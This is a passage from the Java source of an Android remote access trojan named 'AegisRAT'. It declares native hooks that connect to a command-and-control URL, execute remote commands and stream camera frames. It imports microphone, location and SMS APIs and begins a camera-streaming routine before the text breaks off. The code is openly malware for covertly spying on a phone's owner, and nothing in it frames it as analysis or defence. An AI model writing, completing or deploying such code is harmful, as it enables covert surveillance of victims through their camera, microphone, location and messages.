package com.aegis.rat;

import android.Manifest;
import android.content.Context;
import android.content.pm.PackageManager;
import android.location.Location;
import android.location.LocationManager;
import android.media.AudioFormat;
import android.media.AudioRecord;
import android.media.MediaRecorder;
import android.os.Build;
import android.telephony.SmsManager;
import android.util.Log;

import androidx.camera.core.CameraSelector;
import androidx.camera.core.ImageAnalysis;
import androidx.camera.core.ImageProxy;
import androidx.camera.lifecycle.ProcessCameraProvider;
import androidx.core.content.ContextCompat;

import org.json.JSONArray;
import org.json.JSONObject;

import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.atomic.AtomicBoolean;

public class AegisCore {

    private static final String TAG = "AegisRAT";
    private static Context appContext;
    private static ExecutorService executor = Executors.newCachedThreadPool();
    private static volatile AtomicBoolean isCameraStreaming = new AtomicBoolean(false);
    private static volatile AtomicBoolean isMicStreaming = new AtomicBoolean(false);
    private static volatile AudioRecord audioRecord;
    private static volatile ProcessCameraProvider cameraProvider;

    // JNI Native Methods
    public static native boolean nativeInit(Context context, String c2Url, String model, String androidVersion);
    public static native void nativeStreamFrame(byte[] data);
    public static native String nativeExecuteCommand(String command, String args);

    public static void init(Context context, String c2Url) {
        appContext = context.getApplicationContext();
        String model = Build.MODEL;
        String version = Build.VERSION.RELEASE;

        Log.d(TAG, "Initializing AegisRAT. Model: " + model);
        boolean success = nativeInit(appContext, c2Url, model, version);
        if (!success) {
            Log.e(TAG, "Native Init Failed");
        }
    }

    // --- CAMERA STREAMING (CameraX) ---

    public static void startCameraStream(int cameraId) {
        if (isCameraStreaming.get()) return;
        isCameraStreaming.set(true);
        executor.execute(() -> {
            try {
                Log.d(TAG, "Starting Camera Stream (ID: " + cameraId + ")");
                
                // Initialize CameraX
                if (cameraProvider == null) {
                    cameraProvider = ProcessCameraProvider.getInstance(appContext).get();
                }

                CameraSelector selector = (
